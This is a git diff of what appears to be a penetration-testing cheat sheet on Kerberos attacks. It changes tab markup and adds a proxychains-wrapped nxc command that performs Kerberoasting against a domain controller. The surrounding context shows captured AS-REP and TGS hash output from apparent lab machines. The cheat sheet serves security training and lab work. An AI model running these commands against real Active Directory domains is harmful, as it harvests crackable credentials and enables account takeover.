@@ -6,7 +6,7 @@ tags: ["Kerberos", "Impacket", "Kerberoasting", "Asreproast", "Rubeus", "Domain 
 
 ### AS_REP Roasting
 
-{{< tab set1 tab1 active >}}Impacket{{< /tab >}}
+{{< tab set1 tab1 >}}Impacket{{< /tab >}}
 {{< tab set1 tab2 >}}nxc{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
@@ -60,7 +60,7 @@ LDAP        10.10.11.181    445    DC               $krb5asrep$23$d.klay@ABSOLUT
 
 ### Kerberoasting (From Linux)
 
-{{< tab set2 tab1 active >}}Impacket{{< /tab >}}
+{{< tab set2 tab1 >}}Impacket{{< /tab >}}
 {{< tab set2 tab2 >}}nxc{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
@@ -117,11 +117,16 @@ LDAPS       10.10.11.168    636    DC1.scrm.local   sAMAccountName: sqlsvc membe
 LDAPS       10.10.11.168    636    DC1.scrm.local   $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$335aeba3b ...[SNIP]... 9718487474
 ```
 
+```console
+# With socks5 proxy
+proxychains4 -q nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -k --kerberoasting kerberoast_hashes.txt --dns-tcp --dns-server <DC_IP>
+```
+
 {{< /tabcontent >}}
 
 ### Kerberoasting (From Windows)
 
-{{< tab set3 tab1 active >}}rubeus{{< /tab >}}
+{{< tab set3 tab1 >}}rubeus{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
 ```console
